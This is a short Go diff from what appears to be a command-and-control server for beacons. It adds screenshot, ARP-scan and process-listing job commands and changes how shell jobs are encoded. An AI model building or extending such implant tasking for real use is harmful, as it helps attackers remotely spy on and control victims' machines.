@@ -3,9 +3,12 @@ package main
 import "encoding/binary"
 
 const (
-	ECHO     = 2
-	LS       = 3
-	DOWNLOAD = 4
+	ECHO       = 2
+	LS         = 3
+	DOWNLOAD   = 4
+	SCREENSHOT = 5
+	ARP        = 6
+	PROCESS    = 7
 )
 
 type Job struct {
@@ -29,9 +32,7 @@ func make_fucker(listener *Listener, i int) []byte {
 	binary.LittleEndian.PutUint16(command, job.command)
 
 	res = append(res, command...)
-	res = append(res, ReverseBytes([]byte(job.shell))...)
-
-	printkey(res)
+	res = append(res, []byte(job.shell)...)
 
 	listener.Beacons[i].jobs[0].funny = false
 
